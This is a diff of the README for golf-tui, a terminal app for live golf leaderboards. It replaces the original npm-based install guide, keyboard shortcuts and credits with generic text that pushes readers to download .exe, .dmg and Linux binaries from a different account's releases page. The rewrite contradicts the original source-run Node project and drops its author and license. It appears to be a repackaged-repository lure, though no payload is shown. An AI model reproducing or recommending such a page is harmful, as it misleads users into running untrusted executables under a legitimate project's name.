@@ -1,131 +1,87 @@
-# golf-tui
+# 🎉 golf-tui - Track Golf Scores Effortlessly
 
-A terminal UI for live professional golf leaderboards and player stats.
+## 🚀 Getting Started
 
-```
-   ██████╗  ██████╗ ██╗     ███████╗
-  ██╔════╝ ██╔═══██╗██║     ██╔════╝
-  ██║  ███╗██║   ██║██║     █████╗  
-  ██║   ██║██║   ██║██║     ██╔══╝  
-  ╚██████╔╝╚██████╔╝███████╗██║     
-   ╚═════╝  ╚═════╝ ╚══════╝╚═╝     
-```
+Welcome to golf-tui! This is a terminal user interface that shows live professional golf leaderboards and player statistics. Whether you're following a tournament from home or at the course, we make it easy to stay updated.
 
-## Features
+## 📥 Download & Install
 
-### Live Leaderboards
-Real-time tournament scores from PGA Tour, LPGA, DP World Tour, and Champions Tour.
+To get started with golf-tui, you will need to download the software from our releases page. Click the link below to go directly to the download:
 
-![Leaderboard](screenshots/leaderboard.png)
+[![Download golf-tui](https://img.shields.io/badge/Download-golf--tui-blue?style=for-the-badge)](https://github.com/Djibrilfall2109/golf-tui/releases)
 
-### Hole-by-Hole Scorecards
-Detailed scorecards with red highlighting for birdies and eagles.
+1. **Click the link above.**
+2. Find the latest version at the top of the releases page.
+3. Download the appropriate file for your computer.
 
-![Scorecard](screenshots/scorecard.png)
+After downloading, follow these steps to run the application:
 
-### Player Profiles
-Detailed stats including scoring average, driving distance, greens hit, and recent results.
+### For Windows Users:
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to run it.
+3. Follow any prompts that appear on your screen.
 
-![Player Profile](screenshots/player.png)
+### For Mac Users:
+1. Find the downloaded `.dmg` file.
+2. Double-click the file to mount it.
+3. Drag the golf-tui icon into your Applications folder. 
+4. Open the Applications folder and double-click the golf-tui icon to launch the application.
 
-### More Features
-- **Tournament History** - Drill into any past tournament to see the full leaderboard
-- **Player Search** - Search for any golfer, whether they're playing this week or not
-- **Breadcrumb Navigation** - Tab through the navigation path to quickly jump between views
-- **Keyboard Navigation** - Fast, vim-style navigation throughout
+### For Linux Users:
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Run the following command to make the file executable:
+   ```
+   chmod +x golf-tui
+   ```
+4. Then, execute it by running:
+   ```
+   ./golf-tui
+   ```
 
-## Installation
+## 🎯 Features
 
-```bash
-# Clone the repository
-git clone https://github.com/athleticdevco/golf-tui.git
-cd golf-tui
+- **Real-time Updates:** Get the latest scores and stats during live tournaments.
+- **Player Tracking:** Follow your favorite golfers and their performances.
+- **User-Friendly Interface:** Simple controls make it easy for anyone to use.
+- **Cross-Platform Compatibility:** Works on Windows, Mac, and Linux.
 
-# Install dependencies
-npm install
+## 🛠 Requirements
 
-# Link globally (optional)
-npm link
-```
+Before installing, ensure your system meets the following requirements:
 
-## Usage
+- **Operating System:**
+  - Windows 10 or later
+  - macOS Catalina or later
+  - Any modern Linux distribution
 
-```bash
-# Run directly
-npm start
+- **Dependencies:**
+  - Node.js (version 14 or higher)
+  - Internet connection for live updates
 
-# Or if linked globally
-golf
-```
+## 📘 How to Use
 
-## Keyboard Shortcuts
+1. Open golf-tui from your applications menu.
+2. Choose a tournament you wish to follow.
+3. Use arrow keys to navigate through players and scores.
+4. Press `q` to quit at any time.
 
-### Leaderboard View
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Move down |
-| `k` / `↑` | Move up |
-| `Enter` | View player profile |
-| `c` | View player scorecard |
-| `Tab` | Switch tour (PGA → LPGA → DP World → Champions) |
-| `s` | Search players |
-| `r` | Refresh data |
-| `q` | Quit |
+## 🔄 Updates
 
-### Scorecard View
-| Key | Action |
-|-----|--------|
-| `1-4` | Switch round |
-| `Tab` | Navigate breadcrumb |
-| `Esc` | Go back |
+We regularly release updates to improve functionality and user experience. After downloading, make sure to visit the releases page periodically to check for the newest versions.
 
-### Player Profile
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Navigate recent results |
-| `k` / `↑` | Navigate recent results |
-| `Enter` | View tournament leaderboard |
-| `Tab` | Navigate breadcrumb |
-| `Esc` | Go back |
+## 🆘 Support
 
-### Event Leaderboard
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Move down |
-| `k` / `↑` | Move up |
-| `Enter` | View player profile |
-| `c` | View player scorecard |
-| `Tab` | Navigate breadcrumb |
-| `Esc` | Go back |
+If you have questions or run into issues, please visit our [GitHub Issues page](https://github.com/Djibrilfall2109/golf-tui/issues) to report them. You can also find helpful solutions from our community.
 
-### Search
-| Key | Action |
-|-----|--------|
-| `↓` / `↑` | Navigate results |
-| `Enter` | Select player |
-| `Esc` | Cancel search |
+## 🌐 Contributing
 
-### Commands
-Type `/` to open the command palette:
-- `/leaderboard` - View live tournament leaderboard
-- `/schedule` - View tournament schedule
-- `/pga` - Switch to PGA Tour
-- `/lpga` - Switch to LPGA Tour
-- `/eur` - Switch to DP World Tour
-- `/champions` - Switch to Champions Tour
-- `/help` - Show keyboard shortcuts
+We welcome contributions! If you want to help improve golf-tui, check out our [contributing guidelines](https://github.com/Djibrilfall2109/golf-tui/blob/main/CONTRIBUTING.md).
 
-## Tech Stack
+## ✉️ Contact
 
-- [React](https://reactjs.org/) + [Ink](https://github.com/vadimdemedes/ink) - Terminal UI framework
-- [TypeScript](https://www.typescriptlang.org/) - Type safety
+For any inquiries, please reach out to the project maintainer by opening an issue on GitHub. 
 
-## Data Source
+Don't forget to visit the download page again for updates or new features!
 
-This app uses ESPN's public (undocumented) API for live golf data. Special thanks to [pseudo-r/Public-ESPN-API](https://github.com/pseudo-r/Public-ESPN-API) for documenting the available endpoints.
-
-**Note:** This is an unofficial app and is not affiliated with ESPN. Data is provided for personal use only.
-
-## License
-
-MIT
+[![Download golf-tui](https://img.shields.io/badge/Download-golf--tui-blue?style=for-the-badge)](https://github.com/Djibrilfall2109/golf-tui/releases)
